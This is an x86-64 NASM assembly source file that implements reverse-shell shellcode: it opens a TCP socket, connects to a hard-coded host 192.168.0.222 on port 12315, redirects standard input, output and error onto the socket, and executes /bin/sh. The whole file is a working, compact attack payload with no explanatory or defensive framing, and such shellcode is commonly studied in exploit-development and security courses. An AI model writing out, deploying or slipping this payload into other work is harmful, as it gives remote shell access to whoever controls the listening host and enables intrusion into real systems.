;;; utils.s

%define htonl(x) (\
    (((x) & 0x000000ff) << 24) | \
    (((x) & 0x0000ff00) <<  8) | \
    (((x) & 0x00ff0000) >>  8) | \
    (((x) & 0xff000000) >> 24))
%define ip(a,b,c,d) htonl(a << 24 | b << 16 | c << 8 | d) ; ip(127,0,0,1)
%define htons(x) ((((x) & 0xff00) >> 8) | (((x) & 0x00ff) << 8))

%define IP  		ip(192,168,0,222)
%define PORT		htons(12315)		;port, Little Endian
%define AF_INET 	2
%define SOCK_STREAM	1
%define ANY_PROTO	0
	
;;; 	socket -> connect -> dup -> shell
	
BITS 64
	global _start
	
_start:
	
open_my_socket:
	push byte AF_INET
	pop  rdi
	push byte SOCK_STREAM
	pop rsi
	push byte ANY_PROTO
	pop rdx
	mov eax, 41
	syscall

	xchg rax,rdi

make_sockaddr:
	push byte 0		;lame part of sockaddr
	mov rax, (IP << 32 | PORT << 16 | AF_INET) 
	push rax		;important part of sockaddr
	
	mov rsi,rsp		;struct sockaddr*
	push 0x10
	pop rdx			;addrlen
	;RDI=sockfd
	mov eax, 42
	syscall
	;; assume success (RAX=0)
	
	push byte 2		;loop count and FD#
	pop rsi

copy_stdin_out_err:
	mov eax, 33
	syscall
	dec rsi
	jns copy_stdin_out_err
	
	;; Any local shellcode here
	;; incbin "../shell64/shellcode"

local64BinSh:
	xor 	rsi, rsi
	push 	rsi
	mov 	rdi, 0x68732f2f6e69622f ; /bin//sh
	push 	rdi
	mov     rdi, rsp
	mov 	rax, 59
	cdq
	syscall
